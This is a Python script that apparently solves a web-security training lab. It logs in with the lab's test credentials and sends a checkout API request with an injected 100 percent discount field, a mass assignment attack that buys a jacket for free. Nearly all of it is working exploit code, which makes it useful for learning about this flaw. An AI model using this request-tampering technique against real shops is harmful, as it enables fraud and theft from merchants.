'''
To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter. 
'''

import requests
from bs4 import BeautifulSoup

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a03002703db820884d009bb00b900e3.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

r = s.get(f"{url}/api")
'''
API docs reveal 
POST /api/checkout
{
  "chosen_discount": ChosenDiscount,  // defaults to: {"description":null,"discount_id":null,"percentage":0}
  "chosen_products": [ChosenProduct]
}
'''

# login with wiener:peter
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# Add to cart
payload = {
    'productId':1,
    'redir':'CART',
    'quantity':1
}
r = s.post(f"{url}/cart", data=payload)

# Checkout
payload = {
    'chosen_discount': {
        'percentage':100
    },
    'chosen_products':[
        {
            'product_id':'1',
            'quantity':1
        }
    ]
}

r = s.post(f"{url}/api/checkout", json=payload)
